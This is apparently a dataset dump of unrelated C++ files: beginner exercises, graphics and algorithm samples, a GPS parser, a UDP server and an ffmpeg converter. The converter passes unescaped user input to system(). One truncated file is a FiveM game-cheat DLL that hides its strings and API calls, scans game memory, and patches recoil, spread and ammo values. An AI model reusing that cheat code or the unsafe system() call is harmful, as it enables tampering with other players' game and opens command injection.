usuario ingrese dos n\u00fameros y luego el programa muestre por pantalla los n\u00fameros entre el menor\n y el mayor de ambos. Ejemplo, si el usuario ingresa 3 y 15, se mostrar\u00e1n los n\u00fameros entre el 3 y el 15; y si el usuario ingresa 25 y 8,\n se mostrar\u00e1n los n\u00fameros entre el 8 y el 25.\n\n#include <iostream>\n\nusing namespace std;\n\nint main(){\n    int n1,n2;\n    cout << \"Ingrese el primer numero: \";\n    cin >> n1;\n    cout << \"Ingrese el segundo numero: \";\n    cin >> n2;\n\n    while (n1<n2){\n        cout << n1++ << endl;\n    }\n    while (n1>n2){\n        cout << n2++ << endl;\n    }\n    return 0;\n\n}*/\n/*EJERCICIO 6\nHacer un programa para ingresar una lista de n\u00fameros que finaliza cuando se ingresa un cero, luego informar cu\u00e1ntos son positivos y cu\u00e1ntos son negativos.\nEjemplo: 4, -3, 8, -5, 18, 20, 0. Se listar\u00e1 Positivos: 4 Negativos: 2.\nPara resolver este ejercicio sugerimos resolver antes el TP3 EJ 7.\n#include <iostream>\n\nusing namespace std;\n\nint main(){\n\n    return 0;\n\n}\n\n\n/* EJERCICIO 7\nHacer un programa para ingresar una lista de n\u00fameros que finaliza cuando se ingresa un cero, luego informar el m\u00e1ximo.\nEjemplo A: 5, 10, 20, 8, 25, 13, 35, -8, -5, 20, 0. Se listar\u00e1 M\u00e1ximo 35.\nEjemplo B: 5, 10, 20, 8, 55, 13, 55, -8, -5, 20, 0. Se listar\u00e1 M\u00e1ximo 55.\nEjemplo C: -15, -10, -20, -8, -55, -13, -55, -8, -5, -20, 0. Se listar\u00e1 M\u00e1ximo -5.\n#include <iostream>\n\nusing namespace std;\n\nint main(){\n\n    return 0;\n\n}\n*/\n/*EJERCICIO 8\nHacer un programa para ingresar una lista de n\u00fameros que finaliza cuando se ingresa un cero, luego informar el m\u00e1ximo y la posici\u00f3n del m\u00e1ximo en la lista. En caso de \u201cempates\u201d considerar la primera aparici\u00f3n.\nEjemplo A: 5, -10, 20, 8, 25, 13, 35, -8, -5, 20, 0. Se listar\u00e1 M\u00e1ximo 35 Posici\u00f3n 7. Ejemplo B: 5, -10, 20, 8, 25, 13, 55, -8, 55, 20, 0. Se listar\u00e1 M\u00e1ximo 55 Posici\u00f3n 7.\nEjemplo C: -9, -10, -20, -3, -9, -13, -55, -18, -55, 0. Se listar\u00e1 M\u00e1ximo -3 Posici\u00f3n 4.\n#include <iostream>\n\nusing namespace std;\n\nint main(){\n\n    return 0;\n\n}\n*/\n\n",
    "#include \"ofApp.h\"\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::setup() {\r\n\r\n\tofSetFrameRate(25);\r\n\tofSetWindowTitle(\"openFrameworks\");\r\n\r\n\tofBackground(39);\r\n\tofNoFill();\r\n\tofEnableDepthTest();\r\n\r\n\tofColor color;\r\n\tthis->number_of_sphere = 70;\r\n\twhile (this->box_list.size() < this->number_of_sphere) {\r\n\r\n\t\tauto tmp_location = this->make_point(280, ofRandom(0, 50), ofRandom(360), ofRandom(360));\r\n\t\tauto radius = this->box_list.size() < 50 ? ofRandom(20, 60) : ofRandom(10, 20);\r\n\r\n\t\tbool flag = true;\r\n\t\tfor (int i = 0; i < this->box_list.size(); i++) {\r\n\r\n\t\t\tif (glm::distance(tmp_location, get<1>(this->box_list[i])) < get<2>(this->box_list[i]) + radius) {\r\n\r\n\t\t\t\tflag = false;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tif (flag) {\r\n\r\n\t\t\tcolor.setHsb(ofRandom(255), 255, 200);\r\n\t\t\tthis->box_list.push_back(make_tuple(color, tmp_location, radius));\r\n\t\t}\r\n\t}\r\n}\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::update() {\r\n\r\n\tofSeedRandom(39);\r\n}\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::draw() {\r\n\r\n\tthis->cam.begin();\r\n\tofRotateZ(ofGetFrameNum() * 0.77);\r\n\r\n\tfor (int i = 0; i < this->box_list.size(); i++) {\r\n\r\n\t\tauto color = get<0>(this->box_list[i]);\r\n\t\tauto location = get<1>(this->box_list[i]);\r\n\t\tauto radius = get<2>(this->box_list[i]);\r\n\r\n\t\tofPushMatrix();\r\n\t\tofTranslate(location);\r\n\r\n\t\tfor (int k = 0; k < 8; k++) {\r\n\r\n\t\t\tauto noise_seed = glm::vec3(ofRandom(1000), ofRandom(1000), ofRandom(1000));\r\n\t\t\tcolor.setHsb(int(color.getHue() + 32) % 255, 255, 255);\r\n\r\n\t\t\tfor (int m = 0; m < 200; m++) {\r\n\t\t\t\t\r\n\t\t\t\tofSetColor(color, ofMap(m, 0, 200, 32, 255));\r\n\r\n\t\t\t\tauto vertex = glm::vec3(\r\n\t\t\t\t\tofMap(ofNoise(noise_seed.x, m * 0.005 + ofGetFrameNum() * 0.085), 0, 1, -radius * 0.85, radius * 0.85),\r\n\t\t\t\t\tofMap(ofNoise(noise_seed.y, m * 0.005 + ofGetFrameNum() * 0.085), 0, 1, -radius * 0.85, radius * 0.85),\r\n\t\t\t\t\tofMap(ofNoise(noise_seed.z, m * 0.005 + ofGetFrameNum() * 0.085), 0, 1, -radius * 0.85, radius * 0.85)\r\n\t\t\t\t);\r\n\r\n\t\t\t\tauto next = glm::vec3(\r\n\t\t\t\t\tofMap(ofNoise(noise_seed.x, (m + 1) * 0.005 + ofGetFrameNum() * 0.085), 0, 1, -radius * 0.85, radius * 0.85),\r\n\t\t\t\t\tofMap(ofNoise(noise_seed.y, (m + 1) * 0.005 + ofGetFrameNum() * 0.085), 0, 1, -radius * 0.85, radius * 0.85),\r\n\t\t\t\t\tofMap(ofNoise(noise_seed.z, (m + 1) * 0.005 + ofGetFrameNum() * 0.085), 0, 1, -radius * 0.85, radius * 0.85)\r\n\t\t\t\t);\r\n\r\n\t\t\t\tvertex = glm::normalize(vertex) * radius * 0.9;\r\n\t\t\t\tnext = glm::normalize(next) * radius * 0.9;\r\n\r\n\t\t\t\tofDrawLine(vertex, next);\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tofPopMatrix();\r\n\t}\r\n\r\n\tthis->cam.end();\r\n\r\n\t/*\r\n\tint start = 250;\r\n\tif (ofGetFrameNum() > start) {\r\n\r\n\t\tostringstream os;\r\n\t\tos << setw(4) << setfill('0') << ofGetFrameNum() - start;\r\n\t\tofImage image;\r\n\t\timage.grabScreen(0, 0, ofGetWidth(), ofGetHeight());\r\n\t\timage.saveImage(\"image/cap/img_\" + os.str() + \".jpg\");\r\n\t\tif (ofGetFrameNum() - start >= 25 * 20) {\r\n\r\n\t\t\tstd::exit(1);\r\n\t\t}\r\n\t}\r\n\t*/\r\n}\r\n\r\n//--------------------------------------------------------------\r\nglm::vec3 ofApp::make_point(float R, float r, float u, float v) {\r\n\r\n\t// \u6570\u5b66\u30c7\u30c3\u30b5\u30f3\u6559\u5ba4 \u63cf\u3044\u3066\u697d\u3057\u3080\u6570\u5b66\u305f\u3061\u3000P.31\r\n\r\n\tu *= DEG_TO_RAD;\r\n\tv *= DEG_TO_RAD;\r\n\r\n\tauto x = (R + r * cos(u)) * cos(v);\r\n\tauto y = (R + r * cos(u)) * sin(v);\r\n\tauto z = r * sin(u);\r\n\r\n\treturn glm::vec3(x, y, z);\r\n}\r\n\r\n//--------------------------------------------------------------\r\nint main() {\r\n\r\n\tofSetupOpenGL(720, 720, OF_WINDOW);\r\n\tofRunApp(new ofApp());\r\n}",
    "#include<iostream>\r\nusing namespace std;\r\n#define MAX 100\r\n#define initial 1\r\n#define visited 2\r\n\r\n// Global variables\r\nint n;                          \r\nint adj[MAX][MAX];              \r\nint state[MAX];                 \r\nint stack[MAX];                 \r\nint top=-1;                     \r\n// Function prototypes\r\nvoid push(int v);               \r\nint pop();                      \r\nvoid crtgraph();                \r\nvoid dfstravers();              \r\nvoid dfs(int v);                \r\nint isempty_stack();           \r\n\r\nint main() \r\n{\r\n    crtgraph();    \r\n    dfstravers();             \r\n    return 0;\r\n}\r\nvoid dfstravers() \r\n{\r\n    int v;\r\n    // Initialize all vertices as unvisited\r\n    for(v=0;v<n;v++)\r\n        state[v] = initial;\r\n\r\n    // Take input for starting vertex\r\n    cout << \"Enter starting vertex for depth-first search: \";\r\n    cin >> v;\r\n// Start DFS traversal from the given vertex   \r\n    dfs(v);                     \r\n}\r\nvoid dfs(int v) \r\n{\r\n    int i;\r\n    push(v);                \r\n\r\n    while (!isempty_stack())    // While stack is not empty\r\n    {\r\n        v = pop();              // Pop a vertex from the stack\r\n        if(state[v]==initial)   // If the vertex is unvisited\r\n        {\r\n            cout << v << \" \";   // Print the vertex\r\n            state[v] = visited; // Mark the vertex as visited\r\n        }\r\n        \r\n// Traverse the adjacency matrix of vertex v\r\n        for (i = n-1; i >=0 ; i--) \r\n        {\r\n// If there is an edge from v to i and i is unvisited, push i onto the stack\r\n            if (adj[v][i] == 1 && state[i] == initial) \r\n                push(i);\r\n        }\r\n    }\r\n}\r\nvoid crtgraph() \r\n{\r\n    int i, max_edges, origin, destin ;\r\n    // Input the number of nodes\r\n    cout << \"Enter the number of nodes: \";\r\n    cin >> n;\r\n    // Calculate the maximum number of edges\r\n    max_edges = n * (n - 1);\r\n    // Initialize the adjacency matrix\r\n    for (i = 0; i < n; i++) \r\n    {\r\n        for (int j = 0; j < n; j++) \r\n        {\r\n            adj[i][j] = 0;\r\n        }\r\n    }\r\n    // Input the edges of the graph\r\n    for (i = 1; i <= max_edges; i++) \r\n    {\r\n        cout << \"Enter edge (-1 -1 to quit): \";\r\n        cin >> origin >> destin;\r\n        if (origin == -1 && destin == -1)\r\n            break;\r\n        if (origin == -1 || destin >= n || origin < 0 || destin < 0) \r\n        {\r\n            cout << \"Invalid edge.\\n\";\r\n            i--;\r\n        }\r\n        else\r\n            adj[origin][destin] = 1;    \r\n            // Mark the edge in the adjacency matrix\r\n    }\r\n}\r\nvoid push(int v) \r\n{\r\n    if (top >= (MAX-1)) // Check for stack overflow\r\n    {\r\n        cout << \"stack overflow\\n\";\r\n        return;\r\n    }\r\n    \r\n    top = top + 1;\r\n    stack[top] = v;     \r\n}\r\nint pop() \r\n{\r\n    int v;\r\n    if(top == -1)\r\n    {\r\n        cout << \"stack is underflow\\n\";\r\n        // Fix: return an error code instead of exit(1)\r\n        return -1;\r\n    }\r\n    else\r\n    {\r\n        v = stack[top];    \r\n        top = top - 1;\r\n        return v;\r\n    }\r\n}\r\nint isempty_stack() \r\n{\r\n    if (top == -1)     \r\n        return 1;\r\n    else\r\n        return 0;\r\n}\r\n\r\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "// Requeriments: Had ffmpeg already installed.\r\n//Made by boowithbuds\r\n#include <iostream>\r\n#include <string>\r\n#include <cstdlib>\r\n\r\nint main() {\r\n    std::string input_file, output_file;\r\n\r\n    std::cout << \"Enter the path of the input MP4 file: \";\r\n    std::getline(std::cin, input_file);\r\n\r\n    // Generate output file name in the same directory as input file\r\n    size_t last_slash = input_file.find_last_of(\"/\\\\\");\r\n    std::string path = input_file.substr(0, last_slash + 1);\r\n    std::string input_filename = input_file.substr(last_slash + 1);\r\n    size_t extension_pos = input_filename.find_last_of(\".\");\r\n    output_file = path + input_filename.substr(0, extension_pos) + \".mp3\";\r\n\r\n    std::string command = \"ffmpeg -i \\\"\" + input_file + \"\\\" -vn -acodec libmp3lame -ab 128k \\\"\" + output_file + \"\\\"\";\r\n\r\n    int result = system(command.c_str());\r\n\r\n    if (result == 0) {\r\n        std::cout << \"Successful conversion. The MP3 file has been saved as: \" << output_file << std::endl;\r\n    } else {\r\n        std::cerr << \"Error during conversion.\" << std::endl;\r\n        return 1;\r\n    }\r\n\r\n    system(\"pause\");\r\n    return 0;\r\n}",
    "#include \"Core.hpp\"\r\n\r\n#include \"Classes.hpp\"\r\n\r\n#include <native.hpp>\r\n\r\n#include <auth.hpp>\r\n#include <process.h>\r\nbool executedGiveWeaponToPed = false;\r\n#pragma warning(disable : 6031)\r\ntypedef struct _CLIENT_ID\r\n{\r\n\tHANDLE UniqueProcess;\r\n\tHANDLE UniqueThread;\r\n} CLIENT_ID, * PCLIENT_ID;\r\n\r\ntypedef NTSTATUS(NTAPI* RtlCreateUserThread_t)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, SIZE_T, SIZE_T, PTHREAD_START_ROUTINE, PVOID, PHANDLE, PCLIENT_ID);\r\nRtlCreateUserThread_t RtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"RtlCreateUserThread\");\r\n\r\n\r\nBOOLEAN APIENTRY DllMain(HINSTANCE hk_dll, DWORD hk_reason, LPVOID hk_lpReserved)\r\n{\r\n\tUNREFERENCED_PARAMETER(hk_lpReserved);\r\n\r\n\tif (hk_reason == DLL_PROCESS_ATTACH)\r\n\t{\r\n\t\tDisableThreadLibraryCalls(hk_dll);\r\n\t\tif (DEBUG == 0)\r\n\t\t{\r\n\r\n\t\t\t\ttypedef BOOL(__stdcall* AllocConsole_t)();\r\n\t\t\t\tAllocConsole_t AllocConsole_o = (AllocConsole_t)SAFE_CALL(GetProcAddress)(SAFE_CALL(GetModuleHandleA)((E(\"kernel32.dll\"))), E(\"AllocConsole\"));\r\n\r\n\t\t\t\tAllocConsole_o();\r\n\t\t\t\tfreopen_s((FILE**)stdout, E(\"CONOUT$\"), E(\"w\"), stdout);\r\n\t\t}\r\n\r\n\r\n\r\n\r\n/*\r\n\t\t\tif (thread == TestScriptThread) {\r\n\r\n\t\t\t\tif (!executedGiveWeaponToPed) {\r\n\t\t\t\t\tWEAPON::GIVE_WEAPON_TO_PED(PLAYER::PLAYER_PED_ID(), 0xFAD1F1C9, (int)999, (bool)false, (bool)true);\r\n\r\n\t\t\t\t\texecutedGiveWeaponToPed = true;\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n\t\t\t});\r\n\r\n\r\n\t\tDeleteScript(scriptID);\r\n\r\n\t\tAttachScripthook();*/\r\n\t\tFiveM::World = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 48 08 48 85 C9 74 52 8B 81\"), NULL, 7);\r\n\t\tFiveM::ReplayInterface = Memory::PatternScan(E(\"48 8D 0D ? ? ? ? 89 44 24 30 E8 ? ? ? ? 48 83 C4 28 C3 48 8B 05\"), NULL, 7);\r\n\t\tFiveM::W2S = Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\t\tFiveM::BonePos = Memory::PatternScan(E(\"48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC 60 48 8B 01 41 8B E8 48 8B F2 48 8B F9 33 DB\"), NULL, NULL);\r\n\t\tFiveM::Camera = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 98 ? ? ? ? EB\"), NULL, 7);\r\n\t\t//FiveM::Waypoint = Memory::PatternScan(E(\"4C 8D 05 ? ? ? ? 0F B7 C1\"), NULL, 7);\r\n     //   FiveM::IsOnFiveM = (bool)Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10A8;\r\n\t\t\tFiveM::Armor = 0x14B8;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10C8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2E8;\r\n\t\t\tFiveM::Spread = 0x74;\r\n\t\t\tFiveM::ReloadMultiplier = 0x12C;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5E0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x25C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0 + 0x50;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GameProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x1530;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2372_GamePr",
    "#include <iostream>\r\n#include <vector>\r\nusing namespace std;\r\nbool isSafe(vector<vector<int>>& board, int row, int col, int n) {\r\n    for (int i = 0; i < col; ++i)\r\n        if (board[row][i])\r\n            return false;\r\n    for (int i = row, j = col; i >= 0 && j >= 0; --i, --j)\r\n        if (board[i][j])\r\n            return false;\r\n    for (int i = row, j = col; j >= 0 && i < n; ++i, --j)\r\n        if (board[i][j])\r\n            return false;\r\n    return true;\r\n}\r\nbool solveNQueens(vector<vector<int>>& board, int col, int n) {\r\n    if (col >= n)\r\n        return true;\r\n    for (int i = 0; i < n; ++i) {\r\n        if (isSafe(board, i, col, n)) {\r\n            board[i][col] = 1;\r\n            if (solveNQueens(board, col + 1, n))\r\n                return true;\r\n            board[i][col] = 0;\r\n        }\r\n    }\r\n    return false;\r\n}\r\nint main() {\r\n    int n;\r\n    cout << \"Enter the size of the chessboard (n x n): \";\r\n    cin >> n;\r\n    vector<vector<int>> board(n, vector<int>(n, 0));\r\n    if (solveNQueens(board, 0, n)) {\r\n        cout << \"Solution exists:\\n\";\r\n        for (int i = 0; i < n; ++i) {\r\n            for (int j = 0; j < n; ++j)\r\n                cout << board[i][j] << \" \";\r\n            cout << endl;\r\n        }\r\n    } else {\r\n        cout << \"Solution does not exist!\\n\";\r\n    }\r\n    return 0;\r\n}\r\n",
    "/*\nTinyGPSPlus - a small GPS library for Arduino providing universal NMEA parsing\nBased on work by and \"distanceBetween\" and \"courseTo\" courtesy of Maarten Lamers.\nSuggestion to add satellites, courseTo(), and cardinal() by Matt Monson.\nLocation precision improvements suggested by Wayne Holder.\nCopyright (C) 2008-2013 Mikal Hart\nAll rights reserved.\n\nThis library is free software; you can redistribute it and/or\nmodify it under the terms of the GNU Lesser General Public\nLicense as published by the Free Software Foundation; either\nversion 2.1 of the License, or (at your option) any later version.\n\nThis library is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\nLesser General Public License for more details.\n\nYou should have received a copy of the GNU Lesser General Public\nLicense along with this library; if not, write to the Free Software\nFoundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA\n*/\n\n#include \"TinyGPSPlus.h\"\n\n#include <string.h>\n#include <ctype.h>\n#include <stdlib.h>\n\n#define _GPRMCterm   \"GPRMC\"\n#define _GPGGAterm   \"GPGGA\"\n#define _GNRMCterm   \"GNRMC\"\n#define _GNGGAterm   \"GNGGA\"\n\nTinyGPSPlus::TinyGPSPlus()\n  :  parity(0)\n  ,  isChecksumTerm(false)\n  ,  curSentenceType(GPS_SENTENCE_OTHER)\n  ,  curTermNumber(0)\n  ,  curTermOffset(0)\n  ,  sentenceHasFix(false)\n  ,  customElts(0)\n  ,  customCandidates(0)\n  ,  encodedCharCount(0)\n  ,  sentencesWithFixCount(0)\n  ,  failedChecksumCount(0)\n  ,  passedChecksumCount(0)\n{\n  term[0] = '\\0';\n}\n\n// public methods\n//\n\nbool TinyGPSPlus::encode(char c)\n{\n  ++encodedCharCount;\n\n  switch(c)\n  {\n  case ',': // term terminators\n    parity ^= (uint8_t)c;\n  case '\\r':\n  case '\\n':\n  case '*':\n    {\n      bool isValidSentence = false;\n      if (curTermOffset < sizeof(term))\n      {\n        term[curTermOffset] = 0;\n        isValidSentence = endOfTermHandler();\n      }\n      ++curTermNumber;\n      curTermOffset = 0;\n      isChecksumTerm = c == '*';\n      return isValidSentence;\n    }\n    break;\n\n  case '$': // sentence begin\n    curTermNumber = curTermOffset = 0;\n    parity = 0;\n    curSentenceType = GPS_SENTENCE_OTHER;\n    isChecksumTerm = false;\n    sentenceHasFix = false;\n    return false;\n\n  default: // ordinary characters\n    if (curTermOffset < sizeof(term) - 1)\n      term[curTermOffset++] = c;\n    if (!isChecksumTerm)\n      parity ^= c;\n    return false;\n  }\n\n  return false;\n}\n\n//\n// internal utilities\n//\nint TinyGPSPlus::fromHex(char a)\n{\n  if (a >= 'A' && a <= 'F')\n    return a - 'A' + 10;\n  else if (a >= 'a' && a <= 'f')\n    return a - 'a' + 10;\n  else\n    return a - '0';\n}\n\n// static\n// Parse a (potentially negative) number with up to 2 decimal digits -xxxx.yy\nint32_t TinyGPSPlus::parseDecimal(const char *term)\n{\n  bool negative = *term == '-';\n  if (negative) ++term;\n  int32_t ret = 100 * (int32_t)atol(term);\n  while (isdigit(*term)) ++term;\n  if (*term == '.' && isdigit(term[1]))\n  {\n    ret += 10 * (term[1] - '0');\n    if (isdigit(term[2]))\n      ret += term[2] - '0';\n  }\n  return negative ? -ret : ret;\n}\n\n// static\n// Parse degrees in that funny NMEA format DDMM.MMMM\nvoid TinyGPSPlus::parseDegrees(const char *term, RawDegrees &deg)\n{\n  uint32_t leftOfDecimal = (uint32_t)atol(term);\n  uint16_t minutes = (uint16_t)(leftOfDecimal % 100);\n  uint32_t multiplier = 10000000UL;\n  uint32_t tenMillionthsOfMinutes = minutes * multiplier;\n\n  deg.deg = (int16_t)(leftOfDecimal / 100);\n\n  while (isdigit(*term))\n    ++term;\n\n  if (*term == '.')\n    while (isdigit(*++term))\n    {\n      multiplier /= 10;\n      tenMillionthsOfMinutes += (*term - '0') * multiplier;\n    }\n\n  deg.billionths = (5 * tenMillionthsOfMinutes + 1) / 3;\n  deg.negative = false;\n}\n\n#define COMBINE(sentence_type, term_number) (((unsigned)(sentence_type) << 5) | term_number)\n\n// Processes a just-completed term\n// Returns true if new sentence has just passed checksum test and is validated\nbool TinyGPSPlus::endOfTermHandler()\n{\n  // If it's the checksum term, and the checksum checks out, commit\n  if (isChecksumTerm)\n  {\n    byte checksum = 16 * fromHex(term[0]) + fromHex(term[1]);\n    if (checksum == parity)\n    {\n      passedChecksumCount++;\n      if (sentenceHasFix)\n        ++sentencesWithFixCount;\n\n      switch(curSentenceType)\n      {\n      case GPS_SENTENCE_GPRMC:\n        date.commit();\n        time.commit();\n        if (sentenceHasFix)\n        {\n           location.commit();\n           speed.commit();\n           course.commit();\n        }\n        break;\n      case GPS_SENTENCE_GPGGA:\n        time.commit();\n        if (sentenceHasFix)\n        {\n          location.commit();\n          altitude.commit();\n        }\n        satellites.commit();\n        hdop.commit();\n        break;\n      }\n\n      // Commit all custom listeners of this sentence type\n      for (TinyGPSCustom *p = customCandidates; p != NULL && strcmp(p->sentenceName, customCandidates->sentenceN",
    "/*\n\n* Author:       Rick Candell (rick.candell@nist.gov)\n*\n* Organization: National Institute of Standards and Technology\n*               U.S. Department of Commerce\n* License:      Public Domain\n\n*/\n// main.cpp : Defines the main() entry point for the console application.\n//\n\n#define USE_JSON_STR (0)\n\n#include <common.h>\n\n\nusing boost::asio::ip::udp;\nusing namespace std;\n\nint main(int argc, char* argv[])\n{\n\t// program option variables\n\tstring serverPort = \"17998\";\n\tstring bindAddr = \"127.0.0.1\";\n\n\n\t// program options\n\tnamespace po = boost::program_options;\n\tpo::options_description desc(\"Allowed options\");\n\tdesc.add_options()\n\t\t(\"help,h\",\t\t\t\t\t\t\t\t\t\t\t\t\t\"print the help message\")\n\t\t(\"port,p\",\t\tpo::value<string>(&serverPort),\t\t\t\"server port number\")\n\t\t(\"addr,a\",\t\tpo::value<string>(&bindAddr),\t\t\t\t\"bind address\")\n\t\t;\n\n\tpo::variables_map vm;\n\ttry\t{\n\t\tpo::store(po::parse_command_line(argc, argv, desc), vm);\n\t\tif (vm.count(\"help\"))\n\t\t{\n\t\t\tstd::cout << desc << std::endl;\n\t\t\treturn 0;\n\t\t}\n\n\t\tpo::notify(vm);\n\t}\n\tcatch (po::error& e) {\n\t\tstd::cerr << \"ERROR: \" << e.what() << std::endl << std::endl;\n\t\tstd::cerr << desc << std::endl;\n\t\treturn 0;\n\t}\n\n\t// UDP server\n\ttry\n    {\n        boost::asio::io_context io_context;\n        udp::resolver resolver(io_context);\n        std::cout << \"Server: \" << bindAddr << \" Port: \" << serverPort 